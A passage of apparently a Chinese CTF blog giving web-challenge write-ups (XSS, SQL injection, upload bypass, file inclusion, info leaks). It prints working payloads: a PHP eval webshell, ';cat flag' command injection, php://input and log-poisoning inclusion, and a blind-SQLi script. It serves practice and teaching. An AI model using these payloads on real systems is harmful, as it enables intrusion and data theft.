title="XSS基础2:简单绕过"></a>XSS基础2:简单绕过</h2><p>payload：</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>应该进行了检查：XSS_SCRIPT_DETECTED!!!被发现了</p><p>payload：</p><pre><code>&lt;h1&gt;666&lt;/h1&gt;</code></pre><p>得到实现大标题</p><pre><code>&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img&gt; 标签有两个必需的属性：src（规定显示图像的 URL，值为URL）和 alt（规定图像的替代文本，值为text）</code></pre><p>payload：</p><pre><code>&lt;img src=x onclick=alert(HackingLab)&gt;</code></pre><p>key is: xss2test2you</p><p><a href="https://www.runoob.com/tags/ref-eventattributes.html">HTML全局事件属性</a></p><p><strong>HTML 4 的新特性之一是可以使 HTML 事件触发浏览器中的行为，比方说当用户点击某个 HTML 元素时启动一段 JavaScript。</strong></p><h2 id="XSS基础3-检测与构造"><a href="#XSS基础3-检测与构造" class="headerlink" title="XSS基础3:检测与构造"></a>XSS基础3:检测与构造</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8817%E6%97%A51133_1.png" alt=""></p><p>payload（细节闭合）：</p><pre><code>alert&#39; onmousemove=alert(HackingLab)&gt;</code></pre><p><a href="https://www.runoob.com/tags/ev-onmouseover.html">onmouseover</a>：当鼠标指针移至元素之上时运行脚本</p><p><a href="https://www.runoob.com/tags/ev-onmousemove.html">onmousemove</a>：当鼠标指针移动时运行脚本</p><p>这里是当value的值是敏感值时，后边的载荷不会被过滤</p><h2 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h2><p>分值: 300</p><p>原理/原则/理念很重要.....不是所有的xss都叫特仑苏.. ^_^<br>Take it easy!</p><p>查看源代码：  </p><pre><code>Welcome !&lt;a href=&#39;&#39;&gt;Edit Profile(XSS HERE!)&lt;/a&gt; </code></pre><p>也就是说超链接为一个注入点</p><p>payload：</p><pre><code>alert&#39;onmouseover=alert(HackingLab)&gt;javasc&lt;c&gt;ript:al&lt;c&gt;ert(HackingLab) &#39; onmouseover=al&lt;c&gt;ert(HackingLab)&gt;</code></pre><p><a href="https://blog.csdn.net/Jacob12774/article/details/84778322?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">wp</a></p><h2 id="关于xss的其他恶意代码"><a href="#关于xss的其他恶意代码" class="headerlink" title="关于xss的其他恶意代码"></a>关于xss的其他恶意代码</h2><p>1.弹窗跨站：</p><pre><code>&lt;script&gt;window.open(&#39;http//www.xxx.com&#39;,&#39;width=200,height=200’)&lt;/script&gt;</code></pre><h1 id="注入关-环境崩了"><a href="#注入关-环境崩了" class="headerlink" title="注入关(环境崩了)"></a>注入关(环境崩了)</h1><h2 id="最简单的SQL注入"><a href="#最简单的SQL注入" class="headerlink" title="最简单的SQL注入"></a>最简单的SQL注入</h2><pre><code>username=&#39;admin&#39; or 1=1#&#39;password=&#39;123&#39;vcode=&#39;&#39;</code></pre><p><a href="http://blog.spoock.com/2016/06/28/sql-injection-1/">sql注入必备知识</a></p><h1 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h1><h2 id="请上传一张jpg格式的图片"><a href="#请上传一张jpg格式的图片" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 100</p><p>只能上传jpg格式的图片哦~！</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>只是前端验证，bp抓包绕过即可</p><h2 id="请上传一张jpg格式的图片-1"><a href="#请上传一张jpg格式的图片-1" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 150</p><p>只能是jpg哦！</p><p>同上</p><h2 id="请上传一张jpg格式的图片-2"><a href="#请上传一张jpg格式的图片-2" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 150</p><p>只能是jpg哦！</p><p>bp修改位1.jpg.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">var</span> filename<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> str<span class="token operator">=</span>filename<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> ext<span class="token operator">=</span>str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ext<span class="token operator">===</span><span class="token string">'jpg'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请上传一张JPG格式的图片！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对.进行了分离，判断以.为分割符号中的第二位是不是jpg</p></script></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之Web(一)</title>
      <link href="/2021/02/09/ctfshow-zhi-web/"/>
      <url>/2021/02/09/ctfshow-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1387581250&auto=1&height=66"></iframe><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="萌新赛——签到题"><a href="#萌新赛——签到题" class="headerlink" title="萌新赛——签到题"></a>萌新赛——签到题</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span>"curl https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//".$_GET['url'].".ctf.show");</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get传递参数必须要有URL，然后根据URL里面的内容在系统下自动执行curl命令，解题的巧妙之处在于采用分割符“;”，分开执行命令，构造：</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;ls;www</code></pre><p>回显：flag index.php，继续构造：</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;cat flag;www</code></pre><h1 id="2021-02-18（信息搜集1-20）"><a href="#2021-02-18（信息搜集1-20）" class="headerlink" title="2021-02-18（信息搜集1-20）"></a>2021-02-18（信息搜集1-20）</h1><h2 id="前台JS绕过"><a href="#前台JS绕过" class="headerlink" title="前台JS绕过"></a>前台JS绕过</h2><p><strong>js前台拦截 === 无效操作</strong></p><p>当无法f12或者右键查看源代码的时候可以在URL栏view-source:http://网站/ 查看源码</p><h2 id="协议头信息泄露"><a href="#协议头信息泄露" class="headerlink" title="协议头信息泄露"></a>协议头信息泄露</h2><p>没思路的时候抓个包看看，可能会有意外收获</p><h2 id="robots后台泄露"><a href="#robots后台泄露" class="headerlink" title="robots后台泄露"></a>robots后台泄露</h2><p>robots.txt文件</p><h2 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h2><p><strong>phps源码泄露有时候能帮上忙</strong></p><p>关于 phps,phps 其实就是 PHP 的源代码文件, 通常用于提供给用户查看 PHP 代码, 因为用户无法直接通过 Web 浏览器看到 PHP 文件的内容, 所以需要用 phps 文件代替. 其实, 只要不用 PHP 等已经在服务器中注册过的 MIME 类型为文件即可, 但为了国际通用, 所以才用了 phps 文件类型.</p><p>访问 index.phps, 下载下来查看源代码, 即可得到 flag</p><h2 id="源码压缩包泄露"><a href="#源码压缩包泄露" class="headerlink" title="源码压缩包泄露"></a>源码压缩包泄露</h2><p><strong>解压源码到当前目录，测试正常，收工</strong></p><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><h2 id="版本控制泄露源码"><a href="#版本控制泄露源码" class="headerlink" title="版本控制泄露源码"></a>版本控制泄露源码</h2><p><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></p><p>/.git（可以用dirsearch扫描）</p><h2 id="版本控制泄露源码2"><a href="#版本控制泄露源码2" class="headerlink" title="版本控制泄露源码2"></a>版本控制泄露源码2</h2><p><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></p><p>这次我猜是/.svn（是了）</p><h2 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h2><p><strong>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</strong></p><p>程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p><p>用vim编辑时，临时的缓存文件为/.swp/.swn/.swo</p><h2 id="cookie泄露"><a href="#cookie泄露" class="headerlink" title="cookie泄露"></a>cookie泄露</h2><p><strong>cookie 只是一块饼干，不能存放任何隐私数据</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51341_1.png" alt></p><p>ctfshow{86798bd4-7472-4782-ab08-4ff05ae8418a}</p><h2 id="域名txt记录泄露"><a href="#域名txt记录泄露" class="headerlink" title="域名txt记录泄露"></a>域名txt记录泄露</h2><p><strong>域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51346_2.png" alt></p><p><a href="http://www.jsons.cn/nslookup/" target="_blank" rel="noopener">在线域名解析记录</a></p><h2 id="敏感信息公布"><a href="#敏感信息公布" class="headerlink" title="敏感信息公布"></a>敏感信息公布</h2><p><strong>有时候网站上的公开信息，就是管理员常用密码</strong></p><p>用dirsearch扫描得到后台/admin</p><p>信息搜集到的有用信息：</p><p>Help Line Number : 372619038</p><p>eflyer</p><p>利用：</p><p>username：admin  password：372619038</p><h2 id="内部技术文档泄露"><a href="#内部技术文档泄露" class="headerlink" title="内部技术文档泄露"></a>内部技术文档泄露</h2><p><strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></p><p>技术文档：document.pdf</p><p>默认后台地址：<a href="http://your-domain/system1103/login.php" target="_blank" rel="noopener">http://your-domain/system1103/login.php</a> </p><p>默认用户名：admin </p><p>默认密码：admin1103</p><p>访问/system1103/login.php 子目录，得到登录框输入账号密码即可</p><h2 id="编辑器配置不当"><a href="#编辑器配置不当" class="headerlink" title="编辑器配置不当"></a>编辑器配置不当</h2><p><strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</strong></p><p>/editor打开</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51418_3.png" alt></p><p>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</p><p>访问</p><p>nothinghere/fl000g.txt</p><h2 id="密码逻辑脆弱"><a href="#密码逻辑脆弱" class="headerlink" title="密码逻辑脆弱"></a>密码逻辑脆弱</h2><p><strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></p><p><a href="mailto:1156631961@qq.com" target="_blank" rel="noopener">1156631961@qq.com</a></p><p>加好友看看吗，得到信息为：在西安</p><p>/admin密保问题：西安</p><p>您的密码已重置为admin7789</p><h2 id="探针泄露"><a href="#探针泄露" class="headerlink" title="探针泄露"></a>探针泄露</h2><p><strong>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</strong></p><p>/tz.php</p><p>phpinfo得到flag</p><h2 id="CDN穿透"><a href="#CDN穿透" class="headerlink" title="CDN穿透"></a>CDN穿透</h2><p><strong>透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</strong></p><p>我搜狗浏览器自带IP地址显示：flag{111.231.70.44}</p><p>也可以通过ping <a href="http://www.ctfshow.com获得" target="_blank" rel="noopener">www.ctfshow.com获得</a></p><h2 id="js敏感信息泄露"><a href="#js敏感信息泄露" class="headerlink" title="js敏感信息泄露"></a>js敏感信息泄露</h2><p><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></p><p>view-source</p><p>点开：js/Flappy_js.js</p><p>得到这个小游戏的整套源码</p><p>重要部分：</p><pre><code>var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);}else{var result=window.confirm(&quot;GAMEOVER\n鏄惁浠庢柊寮€濮�&quot;);</code></pre><p>Unicode解码：你赢了，去110.php看看</p><h2 id="前端密钥泄露"><a href="#前端密钥泄露" class="headerlink" title="前端密钥泄露"></a>前端密钥泄露</h2><p><strong>密钥什么的，就不要放在前端了</strong></p><pre><code>&lt;!--    error_reporting(0);    $flag=&quot;fakeflag&quot;    $u = $_POST[&#39;username&#39;];    $p = $_POST[&#39;pazzword&#39;];    if(isset($u) &amp;&amp; isset($p)){        if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){            echo $flag;        }}    --&gt;</code></pre><p>post传参提交表单内容</p><pre><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><h2 id="数据库恶意下载"><a href="#数据库恶意下载" class="headerlink" title="数据库恶意下载"></a>数据库恶意下载</h2><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</strong></p><p>/db/db.mdb</p><p>以txt文件格式保存打开搜索ctf得到flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload：</p><pre><code>?url=../../../../etc/passwd</code></pre><p>得到回显，说明存在文件包含漏洞</p><p>payload:</p><pre><code>?url=php://input&lt;?php system(&quot;find / -name ctf*&quot;);?&gt;</code></pre><p>得到回显：</p><pre><code>/var/www/html/ctf_go_go_go/tmp/html/ctf_go_go_go</code></pre><p>payload：</p><pre><code>?url=php://input&lt;?php system(&quot;cat /var/www/html/ctf_go_go_go&quot;);?&gt;</code></pre><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">关于php://的具体信息</a>有必要看！！</p><p><a href="https://www.jb51.net/article/31317.htm" target="_blank" rel="noopener">php://input</a></p><p>ctfshow{99c4134f-64d8-4228-8d29-8fd9ef2682a2}</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></pre><p>payload:</p><pre><code>?url=../../../../etc/passwd</code></pre><p>得到回显，但是无法继web3的操作</p><p><strong>第一种：日志包含</strong><br>通过查看请求头可以知道服务器为nginx，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开。</p><p>为了防止url编码，需要在burp中修改UA为</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>接着菜刀或蚁剑连接:</p><pre><code>http://xxxxxxx/?url=/var/log/nginx/access.log</code></pre><p><strong>第二种：远程文件包含</strong>(未实现)<br>使用自己的公网地址，或者可以在这个网站免费注册域名<a href="https://natapp.cn/，将端口映射到本地的80端口上，打开自己电脑上的服务器，将一句话文件写入，直接菜刀连接" target="_blank" rel="noopener">https://natapp.cn/，将端口映射到本地的80端口上，打开自己电脑上的服务器，将一句话文件写入，直接菜刀连接</a>:</p><pre><code>http://xxxxxxx/?url=http://xxxxxxx/webshell.php</code></pre><h1 id="2021-02-19"><a href="#2021-02-19" class="headerlink" title="2021-02-19"></a>2021-02-19</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ctype_alpha()函数</strong>是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。<strong>如果字符串只包含字母返回true ，否则返回FALSE。</strong></p><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。<strong>是返回true，不是返回false</strong></p><p>那么这里！=如果不是，就是要求v1必须是字母，v2必须是数字，同时满足v1的md5=v2的md5，接下来就涉及到：</p><p><strong>md5漏洞（md5碰撞）：</strong></p><p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。</p><p><a href="https://blog.csdn.net/qq_38603541/article/details/97108663" target="_blank" rel="noopener">常见的MD5碰撞：md5值为0e开头</a></p><p>payload：</p><pre><code>/?v1=QNKCDZO&amp;v2=240610708</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>post传参</p><p>payload：</p><pre><code>username=admin&#39; or 1=1#&amp;password=1</code></pre><p>出现sql inject error，测试特殊字符回显不变，当删去空格，返回初始页面</p><p>一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p><pre><code>username=admin&#39;%09union%09select%091,2,3=1#&amp;password=1username=admin&#39;%09union%09select%091,database(),3=1#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(table_name),3%09from%09information_schema.tables%09where%09table_schema=database()#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(column_name),3%09from%09information_schema.columns%09where%09table_name=&#39;flag&#39;#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(flag),3%09from%09flag#&amp;password=1</code></pre><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>sql盲注脚本：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://5833fd10-7a3d-4f24-ad5d-93394514f061.chall.ctf.show:8080/index.php'</span>table<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print(i)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#爆表名  flag</span>        <span class="token comment" spellcheck="true">#payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>        <span class="token comment" spellcheck="true">#爆字段名 flag</span>        <span class="token comment" spellcheck="true">#payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>        <span class="token comment" spellcheck="true">#读取flag</span>        payload <span class="token operator">=</span> <span class="token string">"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"</span><span class="token operator">%</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        ra <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">'?id=0/**/or/**/'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> ra<span class="token punctuation">:</span>            table <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-02-20"><a href="#2021-02-20" class="headerlink" title="2021-02-20"></a>2021-02-20</h1><p><strong>hints：register.php login.php 大佬们别扫了</strong></p><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//开启Session功能</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取Session变量信息</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">'select pass from user where name="'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'4rfvbgt56yhn.sh'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>执行针对数据库的查询    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>从结果集中取得一行作为关联数组    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"admin!!!!!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span><span class="token string">"/\w\W*/"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 函数执行一个正则表达式搜索并且使用一个回调进行替换。            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"you not admin"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开register.php注册页面</p><pre class="line-numbers language-html"><code class="language-html"><span class="token 